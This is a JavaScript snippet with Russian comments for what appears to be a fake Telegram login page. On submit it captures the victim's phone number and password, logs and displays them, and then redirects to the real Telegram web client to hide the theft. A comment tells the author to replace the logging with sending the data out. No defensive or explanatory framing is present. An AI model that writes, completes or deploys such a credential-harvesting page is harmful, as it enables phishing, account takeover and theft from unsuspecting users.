document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    var phone = document.getElementById('phone').value;
    var password = document.getElementById('password').value;
    
    // Просто показываем данные (замени на отправку)
    console.log("Phone:", phone);
    console.log("Password:", password);
    alert("Data captured: " + phone + " / " + password);
    
    // Переход на настоящий Telegram
    setTimeout(function() {
        window.location.href = "https://web.telegram.org/";
    }, 2000);
});